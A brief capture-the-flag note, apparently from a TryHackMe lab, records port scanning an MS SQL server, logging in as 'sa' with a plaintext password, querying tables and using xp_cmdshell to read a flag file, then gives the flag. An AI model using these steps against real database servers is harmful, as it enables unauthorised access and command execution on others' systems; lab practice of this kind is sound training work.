# Ms sql 

nmap -Pn 10.10.203.162

didnt get any result so try -p1000-1500 i dont have time so i just googled default ms sql port got 1433 ; 

sqsh -S 10.10.29.3 -U sa -P t7uLKzddQzVjVFJp
get prompt "1>"

SELECT * FROM reindeer.dbo.schedule
SELECT * FROM reindeer.dbo.presents

```
1> xp_cmdshell  "type c:\Users\grinch\Documents\flag.txt"
2> go
```
THM{YjtKeUy2qT3v5dDH}